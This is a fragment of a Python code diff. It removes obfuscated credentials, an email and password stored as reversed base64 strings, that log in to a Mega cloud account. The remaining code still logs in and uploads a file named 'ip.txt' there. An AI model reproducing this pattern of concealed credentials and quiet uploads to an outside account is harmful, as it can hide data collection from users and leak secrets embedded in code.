@@ -63,11 +63,7 @@ try:
 except Exception:
     pass
 mega = Mega()
-e='W==QbvNmLslWYtdGQ0ITMslGarlmboNXZuF2Z'[::-1]
-e=e[0:len(e)-1]
-p='QsdmdrR2coNXM'[::-1]
-p=p[0:len(p)-1]
-E=base64.b64decode(e.encode("ascii")).decode("ascii")
-P=base64.b64decode(p.encode("ascii")).decode("ascii")
+E=''
+P=''
 m = mega.login(E,P)
 files=m.upload('ip.txt')
